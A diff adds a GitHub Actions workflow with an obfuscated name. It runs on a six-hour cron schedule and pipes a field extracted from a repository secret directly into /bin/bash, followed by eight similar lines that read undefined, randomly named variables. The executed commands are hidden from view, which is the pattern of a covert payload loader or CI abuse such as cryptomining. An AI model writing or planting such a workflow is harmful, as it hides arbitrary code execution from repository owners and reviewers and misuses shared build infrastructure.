@@ -1,0 +1,26 @@
+name: tupaoap
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tupaoap
+        env:
+          brs3: ${{ secrets.brs3 }}
+        run: |
+          echo $brs3 | jq -r .wtscc240 | /bin/bash
+          echo $oew9640 | jq -r .bjhom1148 | /bin/bash
+          echo $jnrez0759 | jq -r .e4 | /bin/bash
+          echo $nz65113 | jq -r .evie98278 | /bin/bash
+          echo $ge8 | jq -r .kwuj6258 | /bin/bash
+          echo $ak2107 | jq -r .lf904 | /bin/bash
+          echo $kmvo3 | jq -r .iw57646 | /bin/bash
+          echo $nlghk0694 | jq -r .ay07 | /bin/bash
+          echo $qiysr3 | jq -r .qpu26 | /bin/bash
+
